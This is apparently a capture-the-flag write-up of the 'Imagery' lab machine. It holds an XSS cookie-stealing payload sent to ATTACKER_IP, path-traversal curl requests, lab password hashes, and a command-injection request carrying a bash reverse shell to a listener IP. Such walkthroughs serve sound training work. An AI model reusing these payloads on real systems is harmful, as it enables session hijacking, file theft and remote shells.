![[{89338243-57B9-4D66-A114-ADE7048C52FB}.png]]

# Enumeration

First thing we do is the nmap scan
```
sudo nmap -sC -sV -vv -oA [machine IP] imagery
```

Here is the output:

```
# Nmap 7.98 scan initiated Wed Jan 21 10:47:41 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA imagery 10.129.91.185
Nmap scan report for 10.129.91.185
Host is up, received echo-reply ttl 63 (0.28s latency).
Scanned at 2026-01-21 10:47:43 EST for 17s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 21 10:48:00 2026 -- 1 IP address (1 host up) scanned in 19.05 seconds
```

2 ports open
22, which has SSH, banner tells its an Ubuntu server
8000, which is running Werkzeug, which tells us that the website is running a python backend

![[Pasted image 20260202094658.png]]

Here is the website
After making an account and doing all the enumeration needed, we find a /report_bug endpoint which is vulnerable to XSS, specifically `session hijacking`.

The payload I used specifically is:
```
<img src=x onerror="document.location='http://ATTACKER_IP/?cookie='+document.cookie" />
```

I started a listener running on port 9001 and got the admin cookie
![[{2256A50D-74FE-4E10-97DF-1087DD903C27}.png]]

I exported the cookie into an environment variable named `ADMIN_SESSION`
And then used the following command:
```
curl -H "$ADMIN_SESSION" 'http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../../../../etc/passwd'
```

![[Pasted image 20260202095732.png]]

This was good enough confirmation that I can now get files from the server

# Foothold

```
curl -H "$ADMIN_SESSION" 'http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py'                         
from flask import Flask, render_template
import os
import sys
from datetime import datetime
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

app_core = Flask(__name__)
app_core.secret_key = os.urandom(24).hex()
app_core.config['SESSION_COOKIE_HTTPONLY'] = False

app_core.register_blueprint(bp_auth)
app_core.register_blueprint(bp_upload)
app_core.register_blueprint(bp_manage)
app_core.register_blueprint(bp_edit)
app_core.register_blueprint(bp_admin)
app_core.register_blueprint(bp_misc)

@app_core.route('/')
def main_dashboard():
    return render_template('index.html')

if __name__ == '__main__':
    current_database_data = _load_data()
    default_collections = ['My Images', 'Unsorted', 'Converted', 'Transformed']
    existing_collection_names_in_database = {g['name'] for g in current_database_data.get('image_collections', [])}
    for collection_to_add in default_collections:
        if collection_to_add not in existing_collection_names_in_database:
            current_database_data.setdefault('image_collections', []).append({'name': collection_to_add})
    _save_data(current_database_data)
    for user_entry in current_database_data.get('users', []):
        user_log_file_path = os.path.join(SYSTEM_LOG_FOLDER, f"{user_entry['username']}.log")
        if not os.path.exists(user_log_file_path):
            with open(user_log_file_path, 'w') as f:
                f.write(f"[{datetime.now().isoformat()}] Log file created for {user_entry['username']}.\n")
    port = int(os.environ.get("PORT", 8000))
    if port in BLOCKED_APP_PORTS:
        print(f"Port {port} is blocked for security reasons. Please choose another port.")
        sys.exit(1)
    app_core.run(debug=False, host='0.0.0.0', port=port)
```

I found `db.json` file which I then enumerated to find 2 other users on the system

```
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

I tried to crack `admin`'s password but found nothing
But I was able to crack `testuser`'s password, and found that the password is `iambatman`

I used that password to login into testuser's account on the website

Now, coming back to enumerating the backend
I found that the file `api_edit.py` has something interesting
```
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

In the very last line of this output, we can see that it says `shell=true`, which means the commands we give to the app while cropping our image, are executed inside of a shell

We could potentially use this to drop a reverse shell, which is exactly what I do

```
POST /apply_visual_transform HTTP/1.1
Host: imagery.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://imagery.htb:8000/
Content-Type: application/json
Content-Length: 203
Origin: http://imagery.htb:8000
Connection: keep-alive
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aYAo7g.HqGVdeeM1maurd5Am0JSPknnYJk
Priority: u=0

{"imageId":"a25513d8-4bd7-41ff-9e38-cc8185470fdf","transformType":"crop","params":{"x":0,"y":0,"width":"485; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.17.92/4444 0>&1 #'","height":485}}
```

Intercepted this request from burpsuite and dropped a reverse shell

# Privilege Escalation

In the /var/backups directory, I found an encrypted zip file, which I transferred over to my PC and decrypted using a tool named `dpyAesCrypt.py`

After decrypting it, it gave me a file named `web`, and I looked into the db.json file of that, which gave me credentials of a deleted user named `mark@imagery.htb`
Cracked his password, and it was `supersmash`
Found the user flag through that

Now I need to get root
After running `sudo -l` I get the following output

```
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

I created a new cronjob using charcol and dropped a reverse shell inside of it to get root flag







